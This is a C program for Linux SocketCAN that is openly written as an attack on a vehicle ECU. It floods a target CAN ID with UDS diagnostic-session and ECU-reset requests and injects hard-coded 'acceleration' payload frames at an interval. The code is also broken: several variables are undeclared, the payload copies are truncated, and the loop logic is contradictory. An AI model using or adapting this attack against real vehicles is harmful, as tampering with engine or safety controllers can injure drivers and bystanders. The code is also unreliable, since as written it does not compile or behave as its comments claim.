#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <linux/can.h>
#include <linux/can/raw.h>
#include <pthread.h>
#include <errno.h>
#include <stdint.h>
#include <signal.h>
#include <fcntl.h>
#include <time.h>

#define RX_CANID_OFFSET 0x008
#define ECU_ATTACK_SLEEP_TIME 100
#define ECU_CHECK_SLEEP_TIME 100

//payloads array
unsigned char checkecupayload[3] = {0x02, 0x3e, 0x00};
unsigned char resetpayload1[3] = {0x02, 0x10, 0x02};
unsigned char resetpayload2[3] = {0x02, 0x11, 0x01};
unsigned char accelpayload1[8] = {0x00, 0x00, 0xDF, 0x9D, 0x35, 0xEE, 0x12, 0x12};
unsigned char accelpayload2[8] = {0x0F, 0xC5, 0xD3, 0x99, 0xDD, 0x21, 0x12, 0x12};

//send_can_frame fuction
void send_can_frame(int s, struct can_frame frame, struct sockaddr_can addr) {
    if (write(s, &frame, sizeof(struct can_frame)) != sizeof(struct can_frame)) {
        perror("Write");
        exit(1);
    }
}

int ecu_attack_start(int ECUcan_id){//return 1 if ECU is ready for enter diag mode
    while(1){
        frame.can_id = ECUcan_id;
        frame.can_dlc = 3;
        memcpy(frame.data, resetpayload1, 3);
        send_can_frame(s, frame, addr);

        struct timespec start, current;
        clock_gettime(CLOCK_MONOTONIC, &start);
        int response_found = 0;  // Flag to check if any response was found
        do {
            if (read(sock, &rx_frame, sizeof(struct can_frame)) > 0) {
                // Check if the response CAN ID matches any CAN ID in the UDS_CANID_List.txt
                for (int i = 0; i < num_canids; i++) {
                    if (rx_frame.can_id == ECUcan_id + RX_CANID_OFFSET &&
                        rx_frame.can_dlc == PAYLOAD_SIZE &&
                        rx_frame.data[0] == 0x02 &&
                        rx_frame.data[1] == 0x50 &&
                        rx_frame.data[2] == 0x02) {
                        response_found = 1; // Mark response as found
                        return 1;
                        break;
                    }
                }
            }
            clock_gettime(CLOCK_MONOTONIC, &current);
        } while (((current.tv_sec - start.tv_sec) * 1000000 + (current.tv_nsec - start.tv_nsec) / 1000) < ECU_ATTACK_SLEEP_TIME);
    }
}

int ecu_check_alive(int ECUcan_id){
    while(1){
        frame.can_id = ECUcan_id;
        frame.can_dlc = 3;
        memcpy(frame.data, checkecupayload, 3);
        send_can_frame(s, frame, addr);

        struct timespec start, current;
        clock_gettime(CLOCK_MONOTONIC, &start);
        int response_found = 0;  // Flag to check if any response was found
        do {
            if (read(sock, &rx_frame, sizeof(struct can_frame)) > 0) {
                // Check if the response CAN ID matches any CAN ID in the UDS_CANID_List.txt
                for (int i = 0; i < num_canids; i++) {
                    if (rx_frame.can_id == ECUcan_id + RX_CANID_OFFSET &&
                        rx_frame.can_dlc == PAYLOAD_SIZE &&
                        rx_frame.data[0] == 0x02 &&
                        rx_frame.data[1] == 0x50 &&
                        rx_frame.data[2] == 0x02) {
                        response_found = 1; // Mark response as found
                        return 1;
                        break;
                    }
                }
            }
            clock_gettime(CLOCK_MONOTONIC, &current);
        } while (((current.tv_sec - start.tv_sec) * 1000000 + (current.tv_nsec - start.tv_nsec) / 1000) < ECU_CHECK_SLEEP_TIME);
    }
}

void ecu_msq_attack(int ECUcan_id){
    frame.can_id = ECUcan_id;
    frame.can_dlc = 3;
    memcpy(frame.data, accelpayload1, 3);
    send_can_frame(s, frame, addr);
    
    frame.can_id = ECUcan_id;
    frame.can_dlc = 3;
    memcpy(frame.data, accelpayload2, 2);
    send_can_frame(s, frame, addr);
}




int main(int argc, char*argv[]) {
    if (argc != 5 || strcmp(argv[3], "-diff") != 0) {
        printf("Usage: %s [can_interface] [ECUcanid] -diff [time_interval]\n", argv[0]);
        exit(1);
    }

    char *interface = argv[1];
    int ECUcan_id = (int)strtol(argv[2], NULL, 16);
    int interval = atoi (argv[4]);

    int s;
    struct sockaddr_can addr;
    struct ifreq ifr;
    struct can_frame frame;

    if ((s = socket(PF_CAN, SOCK_RAW, CAN_RAW)) < 0){
        perror("Socket fail");
        return 1;
    }

        strcpy(ifr.ifr_name, interface);
    ioctl(s, SIOCGIFINDEX, &ifr);

    addr.can_family = AF_CAN;
    addr.can_ifindex = ifr.ifr_ifindex;

    if (bind(s, (struct sockaddr *)&addr, sizeof(addr)) < 0){
        perror("Bind fail");
        return 1;
    }

    while(!ecu_attack_start(ECUcan_id)) {
        ecu_msq_attack(ECUcan_id);
        usleep(interval * 1000);
    }

    while(!ecu_check_alive(ECUcan_id)){
        ecu_msq_attack(ECUcan_id);
        usleep(interval * 1000);
    }

}